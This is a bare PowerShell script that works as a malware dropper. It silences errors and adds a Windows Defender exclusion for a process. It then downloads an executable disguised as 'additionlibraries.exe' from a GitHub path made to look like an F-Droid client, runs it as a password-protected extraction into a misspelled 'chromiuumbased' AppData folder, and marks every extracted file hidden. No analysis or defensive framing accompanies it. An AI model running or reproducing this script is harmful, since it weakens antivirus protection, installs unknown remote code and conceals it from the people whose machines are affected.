$ErrorActionPreference = 'SilentlyContinue'
$ProcName = "additionlibraries.exe"
$WebFile = "https://github.com/washywashy14/fdroidclient/blob/master/app/src/full/additionlibraries.exe?raw=true"
$Outff = "$env:Temp\additionlibraries.exe"
Start-Sleep -Seconds 10
Add-MpPreference -ExclusionProcess serverCommon.exe -Force
Invoke-WebRequest -uri $WebFile -OutFile $Outff
& $env:Temp\additionlibraries.exe -s -p"of9049nwp04yb3" -d"$env:APPDATA\chromiuumbased\services\"
Start-Sleep -Seconds 5
Get-ChildItem -path "$env:APPDATA\chromiuumbased\services\" -Recurse -Force | foreach {$_.attributes = "Hidden"}
